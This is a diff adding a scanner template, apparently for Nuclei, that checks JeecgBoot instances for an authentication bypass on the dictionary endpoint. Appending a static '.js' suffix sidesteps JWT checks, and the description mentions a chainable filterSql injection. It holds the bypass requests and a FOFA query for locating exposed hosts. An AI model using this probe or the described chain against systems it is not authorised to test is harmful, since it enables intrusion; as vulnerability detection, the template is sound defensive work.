@@ -1,0 +1,43 @@
+id: jeecg-boot-dict-unauth
+
+info:
+  name: JeecgBoot 字典接口认证缺陷 (QVD-2026-56312)
+  author: argus
+  severity: high
+  description: |
+    JeecgBoot ≤ 3.9.3 字典接口存在认证缺陷：Shiro 静态后缀 anon 与 Spring 路径变量路由不一致，JWT 被绕开，可再叠 filterSql 注入。官方补丁未出。
+    本规则对比同一字典接口：无后缀仍返回 token为空（认证在），带静态后缀则进入业务层（不再是 JWT 拦截）。不发送注入语句。
+  reference:
+    - https://github.com/jeecgboot/JeecgBoot/issues/9677
+    - https://github.com/jeecgboot/JeecgBoot/issues/9678
+    - https://cn-sec.com/archives/5398209.html
+  metadata:
+    max-request: 6
+    product: Jeecg-Boot
+    qvd: QVD-2026-56312
+    fofa-query: title="JeecgBoot 企业级低代码平台"
+  tags: jeecg,jeecg-boot,qvd,qvd-2026-56312,dict
+
+http:
+  - raw:
+      - |
+        GET {{base}}/sys/dict/getDictItems/argusfp HTTP/1.1
+        Host: {{Hostname}}
+
+      - |
+        GET {{base}}/sys/dict/getDictItems/argusfp.js HTTP/1.1
+        Host: {{Hostname}}
+
+    payloads:
+      base:
+        - "/jeecgboot"
+        - "/jeecg-boot"
+        - ""
+    stop-at-first-match: true
+    matchers-condition: and
+    matchers:
+      - type: dsl
+        dsl:
+          - status_code_1 == 401 && contains(body_1, "token为空")
+          - status_code_2 == 200 && contains(body_2, "Sign签名校验失败") && !contains(body_2, "token为空")
+        condition: and
